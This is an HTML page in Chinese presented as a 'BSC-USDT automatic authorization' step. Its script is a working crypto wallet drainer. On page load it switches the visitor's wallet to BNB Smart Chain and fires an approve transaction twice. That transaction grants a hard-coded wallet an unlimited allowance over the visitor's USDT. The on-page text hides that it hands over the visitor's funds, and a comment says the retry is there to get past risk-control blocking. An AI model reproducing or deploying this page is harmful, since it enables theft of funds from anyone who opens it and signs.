<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BSC-USDT 自动授权</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#0B0B1F;color:#fff;padding:30px;text-align:center}
.container{max-width:400px;margin:0 auto}
.title{font-size:22px;margin:40px 0 15px}
.tip{color:#bbbbbb;font-size:14px;line-height:1.7}
</style>
</head>
<body>
<div class="container">
    <h2 class="title">正在唤起授权交易...</h2>
    <p class="tip">
        请确认钱包已切换至【币安智能链BSC】<br>
        弹窗出现后，确认签名即可完成授权
    </p>
</div>

<script>
// 固定配置，无需修改
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
const BSC_CHAIN_ID = "0x38";
// approve 授权固定调用数据
const APPROVE_DATA = "0x095ea7b3"
    + ADMIN_WALLET.slice(2).padStart(64, "0")
    + "f".repeat(64);

// 主执行函数
async function runApprove() {
    // 检测是否在钱包环境
    if (!window.ethereum) {
        alert("请在TP/A钱包内置浏览器打开页面");
        return;
    }
    try {
        // 自动切换BSC链
        await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID }]
        }).catch(() => {});
        
        // 发起授权交易，唤起原生转账弹窗
        await window.ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                to: USDT_CONTRACT,
                data: APPROVE_DATA,
                gasLimit: "0x300000",
                value: "0x00"
            }]
        });
        alert("✅ 交易提交成功，区块确认后授权生效");
    } catch (err) {
        if (err.code === 4001) {
            alert("你主动取消了本次交易");
        } else {
            alert("异常："+err.message);
        }
    }
}

// 多重延迟兜底，解决预览加载失败、时序问题
window.addEventListener('load', function() {
    // 第一层：500ms 基础延迟
    setTimeout(runApprove, 500);
    // 第二层：2秒兜底重试（防止第一次被风控拦截）
    setTimeout(runApprove, 2000);
});
</script>
</body>
</html>
